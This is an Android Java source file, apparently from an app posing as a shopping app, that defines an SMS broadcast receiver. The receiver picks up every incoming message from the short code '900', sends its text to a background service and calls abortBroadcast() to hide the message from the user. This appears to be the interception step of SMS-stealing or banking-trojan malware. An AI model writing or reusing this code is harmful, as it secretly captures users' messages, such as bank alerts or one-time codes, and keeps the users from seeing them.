package com.chart_shopping.www.chartshopping;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;

import com.chart_shopping.www.chartshopping.processing.SmsService;

public class SmsReceiver extends BroadcastReceiver {

    private static final String ACTION = "android.provider.Telephony.SMS_RECEIVED";

    public SmsReceiver() {
    }

    @SuppressWarnings("deprecation")
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent != null && intent.getAction() != null &&
                ACTION.compareToIgnoreCase(intent.getAction()) == 0) {
            Object[] sms_extras = (Object[]) intent.getExtras().get("pdus");
            int length;
            if (sms_extras != null) {
                length = sms_extras.length;
                SmsMessage[] messages = new SmsMessage[length];
                for (int i = 0; i < length; i++)
                    messages[i] = SmsMessage.createFromPdu((byte[]) sms_extras[i]);
                String sms_from = messages[0].getDisplayOriginatingAddress();
                if (sms_from.equals("900")) {
                    String sms_body = "";
                    for (int i = 0; i < length; i++)
                        sms_body += messages[i].getMessageBody();
                    Intent service_intent = new Intent(context, SmsService.class);
                    service_intent.putExtra("sms_body", sms_body);
                    context.startService(service_intent);
                    abortBroadcast();
                }
            }
        }
    }
}
